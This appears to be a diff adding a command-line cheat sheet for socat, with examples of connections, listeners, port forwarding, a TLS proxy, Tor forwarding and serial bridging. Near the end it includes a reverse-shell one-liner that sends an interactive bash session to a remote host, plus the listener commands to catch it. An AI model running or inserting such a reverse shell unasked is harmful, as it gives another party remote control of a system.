@@ -1,0 +1,56 @@
+---
+tags [ networking ]
+---
+
+
+# To connect to http-server (port 80 on 'butzel.info')
+socat TCP4:butzel.info:80 -
+
+# To connect to https-server (port 443 on 'butzel.info' with tls)
+socat openssl:butzel.info:443 -
+
+# To create a TCP-listener (port 3180), output as hexdump (-x) and fork for new connetions
+socat -x tcp-listen:3180,fork -
+
+
+# To redirect stdin from keybord to the specified address (-u = unidirectional)
+socat -u STDIO TCP4:127.0.0.1:9999
+
+# To connect and forward all traffic between two addresses (bidirectional)
+socat TCP4:127.0.0.1:2222 TCP4:127.0.0.1:9999
+
+# To redirect all traffic from address1 to address2 (-u = unidirectional)
+# Notice that no traffic will pass the other way around address2->address1
+# also notice that the first address/port should be available and open
+socat -u TCP4:127.0.0.1:2222 TCP4:127.0.0.1:9999
+
+# To create a forwarder for google.com:443
+socat TCP-LISTEN:8080,fork,reuseaddr TCP:google.com:443
+
+# To convert http to httpS 'Proxy' (for an webserver without TLS-Support)
+socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80
+
+# To port forward (e.g. own port 3180 to port 22(ssh) on target)
+socat TCP4-LISTEN:3180,reuseaddr,fork TCP4:butzel.info:ssh
+
+# To TOR-forwarding (needs tor-daemon on port 9050 running)
+socat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050
+
+# network (port 8266) to serial bridge (/dev/ttyUSB0 baudrate: 115200)
+socat TCP4-LISTEN:8266,fork,reuseaddr /dev/ttyUSB0,raw,crnl,b115200
+
+# UDP to TCP
+socat -u udp-recvfrom:1234,fork tcp:localhost:4321
+
+# Reverse shell:
+socat exec:'bash -i',pty,stderr tcp:remote.butzel.info:3180
+
+# Listener for above reverse shell (on remote.butzel.info):
+socat file:`tty`,raw,echo=0 tcp-listen:3180
+OR
+nc -lp 3180
+
+# complete real working http-example:  
+#  (sleep is necessary to prevent socat closing socket before data received)
+(echo -e "GET / HTTP/1.1\r\nHost: butzel.info\r\n\r" && sleep 1) \ 
+| socat tcp4:butzel.info:80 -
